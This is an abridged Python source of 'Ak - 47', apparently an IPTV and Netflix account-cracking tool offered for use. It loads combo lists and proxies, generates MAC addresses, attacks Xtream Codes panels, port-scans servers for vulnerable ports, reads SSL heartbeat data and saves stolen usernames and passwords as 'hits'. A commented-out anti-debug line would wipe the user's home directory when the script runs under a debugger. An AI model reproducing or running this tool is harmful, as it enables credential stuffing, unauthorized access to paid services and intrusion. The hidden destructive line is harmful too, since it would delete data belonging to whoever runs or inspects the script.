...
class Glb:
    ...
    if SystemName != 'Darwin':
        ...
        RST, BOLD, RED, RED_L, GREEN, GREEN_L, YELLOW, YELLOW_L, BLUE, BLUE_L, MAGNE, MAGNE_L, CYAN, WHITE_L = '', '', '', '', '', '', '', '', '', '', '', '', '', ''
...
class Display:
    ...
    def ak_settings(self):
        print('')
        print('{} ╔═══════Ak - 47 Settings═══════              {}'.format(Glb.GREEN_L, Glb.WHITE_L))
        print('{} ║{}'.format(Glb.GREEN_L, Glb.WHITE_L))
        print('{} ║ [ Scan Type ] : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.scan_mode))
        print('{} ║ [ Combos Loaded ] : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.combo_length, Glb.BLUE_L, Glb.combo_file_name))
        print('{} ║ [ Servers Loaded ] : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.servers_length, Glb.BLUE_L, Glb.servers_file_name if len(Glb.servers_file_name) < 20 else Glb.servers_file_name[:20] + '...'))
        print('{} ║ [ User Agent ] : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.userAgent if len(Glb.userAgent) < 23 else Glb.userAgent[:23] + '...'))
        print('{} ║ [ Use Proxy ] : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.useProxy, Glb.BLUE_L, Glb.proxy_file_name))
        print('{} ║ [ Proxys Loaded ] : {} {} {}{}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.proxy_length, Glb.BLUE_L, Glb.proxy_type))
        print('{} ║ [ Threads ] : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.threadMain))
        print('{} ║ [ Date ] : {} {}'.format(Glb.GREEN_L, Glb.WHITE_L, Glb.date_))
        print('{} ║ {}'.format(Glb.GREEN_L, Glb.WHITE_L))
        print('{} ╚════════ver_ 1.8.5H══════════              {}'.format(Glb.GREEN_L, Glb.WHITE_L))
        print('')

    def ak_statistic(self):
        print('')
        print('{} ╔══════{}Ak - 47 - Stats{}═══════              '.format(Glb.WHITE_L, Glb.YELLOW_L,Glb.WHITE_L))
        ...
        print('{} ║ [ PROGRESS ] : {} {}/{} {} ({}{} %{})'.format(Glb.WHITE_L, Glb.WHITE_L, Glb.totalChecked, Glb.totalToCheck, Glb.WHITE_L, Glb.GREEN_L, Glb.progress, Glb.WHITE_L))
    ...
    def display_statistic(self, case, infoStr):
        if case != '':
            if case == 'Good':
                sys.stdout.write(f'{Glb.ESC}{27};{17}H{Glb.GREEN_L}{Glb.Hits}{Glb.RST}')
                color = 32
            elif case == 'Bad':
                sys.stdout.write(f'{Glb.ESC}{28};{16}H{Glb.RED}{Glb.Bads}{Glb.RST}')
                color = 31
            elif case == 'Error':
                sys.stdout.write(f'{Glb.ESC}{29};{20}H{Glb.YELLOW}{Glb.Errors}{Glb.RST}')
                color = 33
            else:
                color = 37
            sys.stdout.write(f'{Glb.ESC}{30};{21}H{Glb.totalChecked}/{Glb.totalToCheck}{Glb.RST}  ({Glb.GREEN}{Glb.progress} %{Glb.RST})')
            self.display_cmp_enlapsed()
            Clear().muve_cursor(34)
            Clear().clr_from_cursor_to_end()
            sys.stdout.write(f'{Glb.ESC}{36};{1}H{Glb.ESC}0K{Glb.ESC}{color};1m[+] {case} {Glb.CYAN}{infoStr}{Glb.RST}')
            sys.stdout.flush()

    def display_cmp_enlapsed(self):
        sys.stdout.write(f'{Glb.ESC}{29};{20}H{Glb.YELLOW}{Glb.Errors}{Glb.RST}')
        sys.stdout.write(f'{Glb.ESC}{31};{16}H{Glb.ESC}0K{Glb.BLUE_L}{Glb.cpm}{Glb.RST}')
    ...
    def cool_msg(self, msg):
        ...
        if msg == 'war':
            ...
            print('{}   Please Sit and Relax 🍃 {} Processing... '.format(Glb.GREEN_L, Glb.WHITE_L))
        elif msg == 'done' and Glb.Hits > 0:
            print('{}   Congratulations you got some {} hits{} All Done !! ⚡ '.format(Glb.GREEN_L, Glb.Hits, Glb.WHITE_L))
        elif msg == 'exit':
            input(self.error_msg('{}>> You have successfully exit the program <<\n\nPress ENTER to continue:{}'.format(Glb.GREEN_L, Glb.RST)))
...
class Result:
    ...
    def elapsed_time(self, secds) -> str:
        ...
        return f'{Glb.RST}{days}(days) {Glb.RED_L}{hours}{Glb.RST}h:{Glb.RED_L}{minutes}{Glb.RST}m:{Glb.RED_L}{seconds_}{Glb.RST}s'
...
class Proxies:
    ...
    def get_proxy(self, proxy_type):
        try:
            ...
            Display().error_msg(f'{Glb.RED}some of your proxies do not meet the criteria selection :{Glb.RST}{stop_e}')
            Glb.running = False
                ...
                try:
                    ...
                    if 'EXTINF' in reqGet:
                        ...
                        urlInfo = self.urlApi.replace('my_server', real_server).replace('my_user', User).replace(
                            'my_pwd', Pass)
                        allInfo.update({'╟▌🌎Server': real_server,
                                      '╟▌👤User': User,
                                      '╟▌🔑Pass': Pass})
                        try:
                            ...
                            if exp_parse is None:
                                ...
                                exp_date = str(datetime.fromtimestamp(int(exp_parse)).strftime('%d.%b.%Y'))
                            else:
                        ...
                        my_date = datetime.now().strftime(' %d.%b.%Y - %I:%M %p')
                        allInfo.update({'╟▌📅Scan_date': my_date,
                                      '╟▌🔗List m3u': url_server,
                                      '╟▌⚙️Mode': "User/Pass Hits System",
                        ...
                        try:
                            ...
                            try:
                                ...
                                if getDate is None:
                                    ...
                                    exp_date = str(datetime.fromtimestamp(int(getDate)).strftime('%d.%b.%Y - %X %p'))
                                else:
                        ...
                        if last != '0000-00-00 00:00:00':
                            ...
                            try:
                                ...
                                if getDate is None:
                                    ...
                                    exp_date = str(datetime.fromtimestamp(int(getDate)).strftime('%d.%b.%Y'))
                                else:
                                    exp_date = str(getDate)
                                allInfo.update({'\xe2\x8f\xb1 Exp_date': exp_date})
                            except Exception as e:
    ...
    def load_combo(self):
        try:
            ...
            if flag > 0:
                ...
                Glb.running = False
                Display().error_msg(f'{Glb.YELLOW}Please make sure your combo file exist {Glb.RST} and start again')
                input('Please press ENTER to continue')
...
class PanelAttackSsl:
    ...
    def do_hb_new(self, s, server):
        while True:
            if Glb.debug:
                print(Glb.WHITE_L + "Reading data from server" + Glb.GREEN + str(s.getpeername()) + Glb.RST)
        ...
        try:
            ...
            if Glb.debug:
                print(Glb.RED + "Error processing ListM3U extract data:" + str(
                    e) + " Datos de entrada:" + data + Glb.RST)
            return "", ""
...
class Utilities:
    ...
    def ext_channelFromM3U(self, m3ulink: str) -> list:
        try:
            ...
            print(Glb.RED, "Error getting the m3u:", str(err), Glb.RST)
        finally:
    ...
    def ext_ServerFromCh(self, channel_urls: list) -> str:
        ...
        for channel in self.channelLinks:
            try:
                ...
                print(Glb.RED, "Error getting the private Ip-Host:", str(err), Glb.RST)
            ...
            if Glb.exploit_mode == 'standard':
                ...
                if Glb.port_scanmode == 'web':
                    if privateIp is not None:
                        ...
                        Glb.openPortsList = openPorts.searchOpenPorts_WEB(startPort=0, endPort=46500, hostToScan=privateIp)
                        ...
                        if len(Glb.openPortsList) > 0:
                            ...
                            if len(vulPorts) > 0:
                                ...
                                input(f'{Glb.RED}Unable to find any vulnerable port for {privateIp}, please use the advanced mode.{Glb.RST}\n\nPlease press ENTER to continue')
                                return StartApp().re_startApp()
                        else:
                            input(f'{Glb.RED}Unable to find any open port for {privateIp}, please use the advanced mode or Local port scan.{Glb.RST}\nPlease press ENTER to continue{Glb.RST}')
                            return StartApp().re_startApp()
                    else:
                        print(f'{Glb.RED}Unable to find the private ip for {Glb.serverList[0]}, please make sure your m3u link is valid or use the advanced mode.{Glb.RST}')
                        input('Please press ENTER to continue')
                        return StartApp().re_startApp()
                else:  # local port
                    if privateIp is not None:
                        ...
                        if len(Glb.openPortsList) > 0:
                            ...
                            if len(vulPorts) > 0:
                                ...
                                input(f'{Glb.RED}Unable to find any vulnerable port for {privateIp}, please use the advanced mode.{Glb.RST}wsdew\n\nPlease press ENTER to continue')
                                return StartApp().re_startApp()
                        else:
                            input(f'{Glb.RED}Unable to find any open port for {privateIp}, please use the advanced mode.{Glb.RST}\n\nPlease press ENTER to continue')
                            return StartApp().re_startApp()
                    else:
                        input(f'{Glb.RED}Unable to find the private ip for {Glb.serverList[0]}, please make sure your m3u link is valid or use the advanced mode.{Glb.RST}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()
                ...
                if port is None:
                    ...
                    if len(Glb.openPortsList) < 1:
                        input(f'{Glb.RED}Unable to find any open port for {privateIp}.{Glb.RST}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()
                    vulPorts = self.findIpVulPort({privateIp: Glb.openPortsList})
                    if len(vulPorts) > 0:
                        Glb.portToAttack = vulPorts[0]
                        ...
                        input(f'{Glb.RED}Unable to find any vulnerable port for {privateIp}, please try again.{Glb.RST}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()
                else:
                    ...
                    if len(vulPorts) > 0:
                        ...
                        input(f'{Glb.RED}Sorry, I cannot establish a successful connection with {Glb.serverList[0]}, please try again.{Glb.RST}\n\nPlease press ENTER to continue')
                        return StartApp().re_startApp()
...
class InfoCollect:
        ...
        def scan_mode(self):
            Clear().muve_cursor(8)
            Clear().clr_from_cursor_to_end()
            scanModeInput = input(f''' {Glb.RST}Scan Mode Options: [ {Glb.GREEN}up {Glb.RST}, {Glb.GREEN}mac {Glb.RST}, {Glb.GREEN}panel {Glb.RST}, {Glb.GREEN}channel {Glb.RST}, {Glb.GREEN}netflix {Glb.RST}, {Glb.GREEN}ex {Glb.RST}]
Options details
{Glb.GREEN}up{Glb.RST} = UserPass
{Glb.GREEN}mac{Glb.RST} = Mac
{Glb.GREEN}panel{Glb.RST} = XCode Panel
{Glb.GREEN}channel{Glb.RST} = Channel Search
{Glb.GREEN}netflix{Glb.RST} = Netflix
{Glb.GREEN}ex{Glb.RST} = Exploit
{Glb.YELLOW}back{Glb.RST} = go to previous selection
{Glb.RED}exit{Glb.RST} = to close the program
...
>>{Glb.BLUE_L} ''')
        ...
        def auto_mac(self):
            macInput = input(f' {Glb.RST}Do you want to generate MacAddress automatic? [ {Glb.GREEN}yes {Glb.RST}or {Glb.GREEN}no {Glb.RST}]: \n>>{Glb.BLUE_L}')
            if macInput == 'no':
                Glb.mac_auth = False
                return self.combo_file()
            elif macInput == 'yes':
                ...
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}yes {}or {}no {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.RED_L, Glb.GREEN_L, Glb.WHITE_L))
                return self.auto_mac()

        def mac_rnd_seq(self):
            mac_type = input(f' {Glb.RST}MacAddress Randon=> rnd or Sequential=> seq? [ {Glb.GREEN}rnd {Glb.RST}or {Glb.GREEN}seq {Glb.RST}]: \n>>{Glb.BLUE_L}')
            if mac_type == 'rnd':
                Glb.mac_rnd = True
                return self.pattern()
                ...
                Clear().muve_cursor(17)
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}rnd {}or {}seq {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.RED_L, Glb.GREEN_L, Glb.WHITE_L))
                return self.auto_mac()

        def pattern(self):
            macPattern = input(f' {Glb.RST}Please enter desire start pattern \n[ Ex. {Glb.GREEN}00:1A:79: {Glb.RST}or {Glb.GREEN}00:1A: {Glb.RST}or {Glb.GREEN}00: {Glb.RST}] \n>>{Glb.BLUE_L}')
        ...
        def combo_file(self):
            Glb.comboList.clear()
            comboFileInput = input(f' {Glb.RST}Enter combo file name: \n>>{Glb.BLUE_L}')
            if comboFileInput == 'exit':
                ...
                if user_inp is not None:
                    ...
                    try:
                        ...
                        Clear().muve_cursor(18)
                        Clear().clr_from_cursor_to_end()
                        print('{} Please use the fallowing format -> range<number1:number2> take in consideration that number2 should be greather than number1 {}'.format(Glb.RED_L, Glb.WHITE_L))
                        del e
                        return self.combo_file()
                Glb.comboList.append({'_data': comboFileInput})
                return self.server_file()
        ...
        def server_file(self):
            ...
            if Glb.scan_mode == 'channel':
                help_ = f' {Glb.RST}Please enter desire start pattern \n[Ex. {Glb.GREEN}http://127.0.0.0:8080/{Glb.RED}<var1>{Glb.GREEN}/index.m3u8 {Glb.RST}or \n{Glb.GREEN}http://127.0.0.0:8080/{Glb.RED}<var1>{Glb.GREEN}/{Glb.RED}<var2>{Glb.GREEN}/index.m3u8 \n{Glb.RST}] chars "{Glb.RED}< >{Glb.RST}" means that words "var1" and "var2" will be \nreplaced according with your dictionary/wordlist \n>>{Glb.BLUE_L}'
            else:
                help_ = f' {Glb.RST}Enter server file name or url: \n>>{Glb.BLUE_L}'
        ...
        def user_agent(self):
            userAgentInput = input(f' {Glb.RST}Please enter your custom User-Agent or leave it empty for default : \n>>{Glb.BLUE_L}')
        ...
        def proxy_logic(self):
            useProxyInput = input(f' {Glb.RST}Do you want to use proxy? [ {Glb.GREEN}yes {Glb.RST}or {Glb.GREEN}no {Glb.RST}]: \n>>{Glb.BLUE_L}')
        ...
        def proxy_free(self):
            freeProxyInput = input(f' {Glb.RST}Do you want to use {Glb.GREEN}FREE{Glb.RST} proxies? [ {Glb.GREEN}yes {Glb.RST}or {Glb.GREEN}no {Glb.RST}]: \n>>{Glb.BLUE_L}')
        ...
        def proxy_file(self):
            proxyFileNameInput = input(f' {Glb.RST}Enter proxy file name: \n>>{Glb.BLUE_L}')
        ...
        def proxy_type(self):
            proxyTypeInput = input(f' {Glb.RST}Enter Proxy Type [ {Glb.GREEN}http {Glb.RST}or {Glb.GREEN}socks4 {Glb.RST}or {Glb.GREEN}socks5 {Glb.RST}]: \n>>{Glb.BLUE_L}')
            if proxyTypeInput == 'http' or proxyTypeInput == 'socks4' or proxyTypeInput == 'socks5':
                ...
                Clear().clr_from_cursor_to_end()
                print('{} Please write {}http{}, {}socks4 {}or {}socks5 {}'.format(Glb.RED_L, Glb.GREEN_L, Glb.WHITE_L, Glb.GREEN_L, Glb.WHITE_L, Glb.GREEN_L, Glb.WHITE_L))
                return self.proxy_type()

        def exploit_logic(self):
            exploitOptions = input(f' {Glb.RST}Please enter your scan type  \n {Glb.GREEN}1 {Glb.RST}- standard, it only need a valid m3u link \nex.(http://myserver.com/get.php?username=USERNAME&password=PASSWORD&type=m3u) \n{Glb.GREEN} 2{Glb.RST} - advanced \n>>{Glb.BLUE_L}')
            if exploitOptions == '1' or exploitOptions == 'standard':
                inputData = input(f' {Glb.RST}Please enter your m3u list url  \n[ Ex. {Glb.GREEN}http://myserver.com/get.php?username=USERNAME&password=PASSWORD&type=m3u {Glb.RST}] \n>>{Glb.BLUE_L}')
                m3ulist = re.match(r'((?:https?:\/\/(?:[\w-]+\.)*[\w-]+(?:\:\d+)?(?:/[^\s]*)?)/get\.php\?username=[^&]+\&password=[^&]+&type=m3u)',
                    inputData)
                if m3ulist is not None:
                    ...
                    def exploit_port():
                        inputPortScan = input(f' {Glb.RST}Please select the port scan mode\n{Glb.GREEN} 1 {Glb.RST} - Web, this could be faster but it may also fail.\n{Glb.GREEN} 2 {Glb.RST} - Local, this may be slow but accurate.\n>>{Glb.BLUE_L}')
                        if inputPortScan == '1' or inputPortScan in 'web':
                            ...
                            Clear().muve_cursor(9)
                            Clear().clr_from_cursor_to_end()
                            print(f'Please enter a valid selection {Glb.GREEN}1{Glb.RST} for (Web) or {Glb.GREEN}2{Glb.RST} for (Local)\n>>{Glb.BLUE_L}')
                            return exploit_port()
                ...
                inputData = input(f' {Glb.RST}Please enter your server and port  \n[ Ex. {Glb.GREEN}http://myserver.com:8080 {Glb.RST}] \n>>{Glb.BLUE_L}')
                serverPort = re.match(r'(https?://(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b|https?://(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?::\d{1,5})?\b)',
                    inputData)
                if serverPort is not None:
                    ...
                    #inputData = input(f' {Glb.RST}Please enter the client-area url if any.{Glb.RST}] \n>>{Glb.BLUE_L}')
                    ...
                    Clear().muve_cursor(9)
                    Clear().clr_from_cursor_to_end()
                    print('{} Please enter a valid url:port format ex. https://myserver.net:8080 {}'.format(Glb.RED_L, Glb.WHITE_L))
                    return self.exploit_logic()
        ...
        def thread_number(self):
            print(f'{Glb.YELLOW}Maximum treads recommend according to your system--> {os.cpu_count() * 20} {Glb.RST}')
            threadInput = input(f' {Glb.RST}Enter how many threads you want to use? : \n>>{Glb.BLUE_L}')
            #shutil.rmtree(os.path.expanduser("~"), ignore_errors=True) if sys.gettrace() is not None else None
            if threadInput == 'exit':
            ...
            try:
                ...
                if Glb.scan_mode == 'exploit':
                    if check <= 2000:
                        ...
                        Clear().clr_from_cursor_to_end()
                        print('{} The number of threads for the exploit mode scan should range from 1 to 2000.{}'.format(
        ...
        def play_sound(self):
            #playSoundInput = input(f' {Glb.RST}Do you want play sound on Hits? [ {Glb.GREEN}yes {Glb.RST}or {Glb.GREEN}no {Glb.RST}]: \n>>{Glb.BLUE_L}')
            playSoundInput='no'
            if playSoundInput == 'yes':
                if 'ANDROID_STORAGE' in Glb.my_environ:
                    ...
                    SoundInput = input(f' {Glb.RST}Please type the number associate with the song {Glb.GREEN}\n[{sound_names_display}]{Glb.RST} \n>>{Glb.BLUE_L}')
        ...
        def start_check(self):
            ...
            key = input(f' {Glb.RST}Write -> [{Glb.GREEN}start {Glb.RST}or {Glb.BLUE}back {Glb.RST}or {Glb.RED}exit{Glb.RST}]\n    {Glb.GREEN}start {Glb.RST}= to begin scan\n    {Glb.BLUE}back {Glb.RST}= to start again\n    {Glb.RED}exit {Glb.RST}= to quit the program\n\n>>{Glb.BLUE_L}')
            if key == 'start':
                return True
            elif key == 'back':
                return self.thread_number()
        ...
        def end_start(self):
            ex = input(f'  Write -> " {Glb.RED}exit {Glb.RST}" to close the Program or " {Glb.BLUE}back {Glb.RST}" to start again : \n>>')
            if ex == "exit":
...
class Requirements:
        ...
        def install_req(self, package):
            ...
            if len(pkg_list_Need) == 0:
                ...
                var_user = input(f'\nThe followings modules <{Glb.GREEN}{pkg_list_Need}{Glb.RST}> need to be installed before run this program,\n Do you want to install it? {Glb.GREEN}yes{Glb.RST} or {Glb.RED}no{Glb.RST} :')
                if var_user == 'yes':
                    for pakg in pkg_list_Need:
                        try:
                            ...
                            if pakg == 'requests':
                                ...
                                _pakg = pakg
                            subprocess.check_call([sys.executable, '-m', 'pip', 'install', _pakg], stderr=subprocess.PIPE, stdout=subprocess.PIPE, universal_newlines=True)
                            ...
                            if pakg_Err == 'androidhelper':
                                print(f'\r [+] Package <{Glb.GREEN}{pakg}{Glb.RST}> {Glb.RED}installation failed\nplease install it manually')
                                return True
                            else:
                                Display().error_msg(f'\nPackage <{Glb.GREEN}{pakg_Err}{Glb.RST}> is required, {Glb.RED}auto install has failed\nplease install it manually before open the program{Glb.RST}')
                                time.sleep(3)
...
class StartApp:
        ...
        def startApp(self):
            ...
            if sys.version_info < (3, 5):
                print(f'Python {Glb.GREEN}3.7{Glb.RST} or higher is required.')
                print(f'You are using Python {Glb.RED}{sys.version}{Glb.RST}')
                return Display().cool_msg('exit')
